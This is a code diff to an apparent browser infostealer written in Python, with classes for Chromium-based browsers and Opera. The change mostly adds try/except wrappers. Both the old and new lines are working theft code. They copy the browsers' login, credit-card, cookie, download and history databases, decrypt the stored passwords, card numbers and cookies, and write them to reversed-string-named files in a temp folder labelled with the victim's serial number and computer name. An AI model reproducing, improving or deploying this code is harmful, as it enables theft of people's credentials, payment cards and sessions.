@@ -35,163 +35,184 @@ class Chromium:
         tools.write_text.main("yrotsiH")
         self.callback()
     def createDirectory(self):
-        currentDirectory = os.environ["temp"] + f"\\{serialNumber}__{self.compname}"
-        value = "drowssaP"[::-1]
-        value2 = "sdraC tiderC"[::-1]
-        value3 = "seikooC"[::-1]
-        value4 = "sdaolnwoD"[::-1]
-        value5 = "yrotsiH"[::-1]
         try:
-            os.mkdir(currentDirectory + f"\\{value}")
-            os.mkdir(currentDirectory + f"\\{value2}")
-            os.mkdir(currentDirectory + f"\\{value3}")
-            os.mkdir(currentDirectory + f"\\{value4}")
-            os.mkdir(currentDirectory + f"\\{value5}")
+            currentDirectory = os.environ["temp"] + f"\\{serialNumber}__{self.compname}"
+            value = "drowssaP"[::-1]
+            value2 = "sdraC tiderC"[::-1]
+            value3 = "seikooC"[::-1]
+            value4 = "sdaolnwoD"[::-1]
+            value5 = "yrotsiH"[::-1]
+            try:
+                os.mkdir(currentDirectory + f"\\{value}")
+                os.mkdir(currentDirectory + f"\\{value2}")
+                os.mkdir(currentDirectory + f"\\{value3}")
+                os.mkdir(currentDirectory + f"\\{value4}")
+                os.mkdir(currentDirectory + f"\\{value5}")
+            except:
+                pass
         except:
             pass
     def safeBrowsers(self, path, filee, profile):
-        if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
-            return
-        else:
-            global count
-            self.copy(path, filee, profile, self.zink2)
-            exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select origin_url, action_url, username_value, password_value from logins")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value2 = Exela[1]
-                value3 = Exela[2]
-                quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", "User Data"))
-                if quicaxd:
-                    count += 1
-                    variable0 = "LRU nigirO"[::-1]
-                    variable2 = "LRU noitcA"[::-1]
-                    variable3 = "emanresU"[::-1]
-                    variable = "drowssaP"[::-1]
-                    variable4 = "resworB"[::-1]
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee + "_" + profile)
-                else:
-                    continue
-                tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
-            try:
-                cursor.close()
-                exela.close()
-                os.remove(os.getenv("localappdata") + f"\\{self.newFileName}")
-            except:
-                pass
-    def safeBrowserCC(self, path, filee, profile):
-        if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
-            return
-        else:
-            global CCcount
-            exelaa = "sdraC tiderC"[::-1]
-            self.copy(path, filee,profile, self.zink3)
-            exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
-            for Exela in cursor.fetchall():
-                value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
-                value1 = Exela[1]
-                value2 = Exela[2]
-                value3 = Exela[3]
-                if value:
-                    CCcount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
-                else:
-                    continue
         try:
-            cursor.close()
-            exela.close()
-            os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
+            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
+                return
+            else:
+                global count
+                self.copy(path, filee, profile, self.zink2)
+                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select origin_url, action_url, username_value, password_value from logins")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value2 = Exela[1]
+                    value3 = Exela[2]
+                    quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", "User Data"))
+                    if quicaxd:
+                        count += 1
+                        variable0 = "LRU nigirO"[::-1]
+                        variable2 = "LRU noitcA"[::-1]
+                        variable3 = "emanresU"[::-1]
+                        variable = "drowssaP"[::-1]
+                        variable4 = "resworB"[::-1]
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee + "_" + profile)
+                    else:
+                        continue
+                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
+                try:
+                    cursor.close()
+                    exela.close()
+                    os.remove(os.getenv("localappdata") + f"\\{self.newFileName}")
+                except:
+                    pass
         except:
             pass
-    def safeBrowserCookie(self, path, filee, profile):
-        if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
-            return
-        else:
-            global CookieCount
-            exelaa = "seikooC"[::-1]
-            shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{self.zink5}\\{self.zink6}", os.getenv("localappdata") + "\\" + self.newFileName)
-            exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value1 = Exela[1]
-                value2 = Exela[2]
-                quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
-                value3 = Exela[4]
-                entry = ""
-                entry2 = ""
-                if quicaxdd:
-                    CookieCount += 1
-                    if value3 == 0:
-                        entry = "FALSE"
+    def safeBrowserCC(self, path, filee, profile):
+        try:
+            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
+                return
+            else:
+                global CCcount
+                exelaa = "sdraC tiderC"[::-1]
+                self.copy(path, filee,profile, self.zink3)
+                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
+                for Exela in cursor.fetchall():
+                    value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
+                    value1 = Exela[1]
+                    value2 = Exela[2]
+                    value3 = Exela[3]
+                    if value:
+                        CCcount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
                     else:
-                        entry = "TRUE"
-                    if value.startswith("."):
-                        entry2 = "FALSE"
-                    else:
-                        entry2 = "TRUE"
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
+                        continue
             try:
                 cursor.close()
                 exela.close()
                 os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
-            except Exception as e:
+            except:
                 pass
-    def safeBrowserDownLoads(self, path, filee, profile):
-        if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
-            return
-        else:
-            global DownloadsCount
-            exelaa = "sdaolnwoD"[::-1]
-            exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select tab_url, target_path from downloads")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value1 = Exela[1]
-                if value or value1:
-                    DownloadsCount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
-                else:
-                    pass
-        try:
-            cursor.close()
-            exela.close()
-            os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
         except:
-            pass  
-    def safeBrowserHistory(self, path, filee, profile):
-        if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
-            return
-        else:
-            global HistoryCount
-            exelaa = "yrotsiH"[::-1]
-            self.copy(path, filee,profile, self.zink4)
-            exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select url from urls")
-            for Exela in cursor.fetchall():
-                Url = Exela[0]
-                if Url:
-                    HistoryCount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
-                else:
-                    continue
+            pass
+    def safeBrowserCookie(self, path, filee, profile):
         try:
-            cursor.close()
-            exela.close()
+            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
+                return
+            else:
+                global CookieCount
+                exelaa = "seikooC"[::-1]
+                shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{self.zink5}\\{self.zink6}", os.getenv("localappdata") + "\\" + self.newFileName)
+                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value1 = Exela[1]
+                    value2 = Exela[2]
+                    quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
+                    value3 = Exela[4]
+                    entry = ""
+                    entry2 = ""
+                    if quicaxdd:
+                        CookieCount += 1
+                        if value3 == 0:
+                            entry = "FALSE"
+                        else:
+                            entry = "TRUE"
+                        if value.startswith("."):
+                            entry2 = "FALSE"
+                        else:
+                            entry2 = "TRUE"
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
+                try:
+                    cursor.close()
+                    exela.close()
+                    os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
+                except Exception as e:
+                    pass
+        except:
+            pass
+    def safeBrowserDownLoads(self, path, filee, profile):
+        try:
+            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
+                return
+            else:
+                global DownloadsCount
+                exelaa = "sdaolnwoD"[::-1]
+                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select tab_url, target_path from downloads")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value1 = Exela[1]
+                    if value or value1:
+                        DownloadsCount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
+                    else:
+                        pass
+            try:
+                cursor.close()
+                exela.close()
+                os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
+            except:
+                pass  
+        except:
+            pass
+    def safeBrowserHistory(self, path, filee, profile):
+        try:
+            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
+                return
+            else:
+                global HistoryCount
+                exelaa = "yrotsiH"[::-1]
+                self.copy(path, filee,profile, self.zink4)
+                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select url from urls")
+                for Exela in cursor.fetchall():
+                    Url = Exela[0]
+                    if Url:
+                        HistoryCount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
+                    else:
+                        continue
+            try:
+                cursor.close()
+                exela.close()
+            except:
+                pass
         except:
             pass
     def copy(self, path, filee, profile, file_path):
-        shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{file_path}", os.getenv("localappdata") + "\\" + self.newFileName)
+        try:
+            shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{file_path}", os.getenv("localappdata") + "\\" + self.newFileName)
+        except:
+            pass
     def callback(self):
         self.safeBrowsers("Google", "Chrome", "Default")
         self.safeBrowserCC("Google", "Chrome", "Default")
@@ -247,145 +268,163 @@ class Opera:
         self.safeBrowserHistory("Opera Software", "Opera Stable")
         self.safeBrowserDownLoads("Opera Software", "Opera Stable")
     def safeBrowsers(self, path, filee):
-        if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
-            return
-        else:
-            global count
-            self.copy(path, filee, self.zink2)
-            exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select origin_url, action_url, username_value, password_value from logins")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value2 = Exela[1]
-                value3 = Exela[2]
-                quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
-                if quicaxd:
-                    count += 1
-                    variable0 = "LRU nigirO"[::-1]
-                    variable2 = "LRU noitcA"[::-1]
-                    variable3 = "emanresU"[::-1]
-                    variable = "drowssaP"[::-1]
-                    variable4 = "resworB"[::-1]
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee)
-                else:
-                    continue
-                tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
-            try:
-                cursor.close()
-                exela.close()
-                os.remove(os.getenv("appdata") + f"\\{self.newFileName}")
-            except:
-                pass
-    def safeBrowserCC(self, path, filee):
-        if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
-            return
-        else:
-            global CCcount
-            exelaa = "sdraC tiderC"[::-1]
-            self.copy(path, filee, self.zink3)
-            exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
-            for Exela in cursor.fetchall():
-                value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
-                value1 = Exela[1]
-                value2 = Exela[2]
-                value3 = Exela[3]
-                if value:
-                    CCcount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
-                else:
-                    pass
         try:
-            cursor.close()
-            exela.close()
-            os.remove(os.getenv("appdata") + "\\" + self.newFileName)
+            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
+                return
+            else:
+                global count
+                self.copy(path, filee, self.zink2)
+                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select origin_url, action_url, username_value, password_value from logins")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value2 = Exela[1]
+                    value3 = Exela[2]
+                    quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
+                    if quicaxd:
+                        count += 1
+                        variable0 = "LRU nigirO"[::-1]
+                        variable2 = "LRU noitcA"[::-1]
+                        variable3 = "emanresU"[::-1]
+                        variable = "drowssaP"[::-1]
+                        variable4 = "resworB"[::-1]
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee)
+                    else:
+                        continue
+                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
+                try:
+                    cursor.close()
+                    exela.close()
+                    os.remove(os.getenv("appdata") + f"\\{self.newFileName}")
+                except:
+                    pass
         except:
             pass
-    def safeBrowserCookie(self, path, filee):
-        if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
-            return
-        else:
-            global CookieCount
-            exelaa = "seikooC"[::-1]
-            shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{self.zink5}\\{self.zink6}", os.getenv("appdata") + "\\" + self.newFileName)
-            exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value1 = Exela[1]
-                value2 = Exela[2]
-                quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
-                value3 = Exela[4]
-                entry = ""
-                entry2 = ""
-                if quicaxdd:
-                    CookieCount += 1
-                    if value3 == 0:
-                        entry = "FALSE"
+    def safeBrowserCC(self, path, filee):
+        try:
+            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
+                return
+            else:
+                global CCcount
+                exelaa = "sdraC tiderC"[::-1]
+                self.copy(path, filee, self.zink3)
+                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
+                for Exela in cursor.fetchall():
+                    value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
+                    value1 = Exela[1]
+                    value2 = Exela[2]
+                    value3 = Exela[3]
+                    if value:
+                        CCcount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
                     else:
-                        entry = "TRUE"
-                    if value.startswith("."):
-                        entry2 = "FALSE"
-                    else:
-                        entry2 = "TRUE"
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
+                        pass
             try:
                 cursor.close()
                 exela.close()
                 os.remove(os.getenv("appdata") + "\\" + self.newFileName)
-            except Exception as e:
+            except:
                 pass
-    def safeBrowserDownLoads(self, path, filee):
-        if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
-            return
-        else:
-            global DownloadsCount
-            exelaa = "sdaolnwoD"[::-1]
-            exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select tab_url, target_path from downloads")
-            for Exela in cursor.fetchall():
-                value = Exela[0]
-                value1 = Exela[1]
-                if value or value1:
-                    DownloadsCount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
-                else:
-                    pass
-        try:
-            cursor.close()
-            exela.close()
-            os.remove(os.getenv("appdata") + "\\" + self.newFileName)
         except:
-            pass  
-    def safeBrowserHistory(self, path, filee):
-        if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
-            return
-        else:
-            global HistoryCount
-            exelaa = "yrotsiH"[::-1]
-            self.copy(path, filee, self.zink4)
-            exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
-            cursor = exela.cursor()
-            cursor.execute("select url from urls")
-            for Exela in cursor.fetchall():
-                Url = Exela[0]
-                if Url:
-                    HistoryCount += 1
-                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
-                else:
-                    continue
+            pass
+    def safeBrowserCookie(self, path, filee):
         try:
-            cursor.close()
-            exela.close()
+            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
+                return
+            else:
+                global CookieCount
+                exelaa = "seikooC"[::-1]
+                shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{self.zink5}\\{self.zink6}", os.getenv("appdata") + "\\" + self.newFileName)
+                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value1 = Exela[1]
+                    value2 = Exela[2]
+                    quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
+                    value3 = Exela[4]
+                    entry = ""
+                    entry2 = ""
+                    if quicaxdd:
+                        CookieCount += 1
+                        if value3 == 0:
+                            entry = "FALSE"
+                        else:
+                            entry = "TRUE"
+                        if value.startswith("."):
+                            entry2 = "FALSE"
+                        else:
+                            entry2 = "TRUE"
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
+                try:
+                    cursor.close()
+                    exela.close()
+                    os.remove(os.getenv("appdata") + "\\" + self.newFileName)
+                except Exception as e:
+                    pass
+        except:
+            pass
+    def safeBrowserDownLoads(self, path, filee):
+        try:
+            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
+                return
+            else:
+                global DownloadsCount
+                exelaa = "sdaolnwoD"[::-1]
+                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select tab_url, target_path from downloads")
+                for Exela in cursor.fetchall():
+                    value = Exela[0]
+                    value1 = Exela[1]
+                    if value or value1:
+                        DownloadsCount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
+                    else:
+                        pass
+            try:
+                cursor.close()
+                exela.close()
+                os.remove(os.getenv("appdata") + "\\" + self.newFileName)
+            except:
+                pass  
+        except:
+            pass
+    def safeBrowserHistory(self, path, filee):
+        try:
+            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
+                return
+            else:
+                global HistoryCount
+                exelaa = "yrotsiH"[::-1]
+                self.copy(path, filee, self.zink4)
+                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
+                cursor = exela.cursor()
+                cursor.execute("select url from urls")
+                for Exela in cursor.fetchall():
+                    Url = Exela[0]
+                    if Url:
+                        HistoryCount += 1
+                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
+                    else:
+                        continue
+            try:
+                cursor.close()
+                exela.close()
+            except:
+                pass
         except:
             pass
     def copy(self, path, filee, file_path):
-        shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{file_path}", os.getenv("appdata") + "\\" + self.newFileName)
+        try:
+            shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{file_path}", os.getenv("appdata") + "\\" + self.newFileName)
+        except:
+            pass
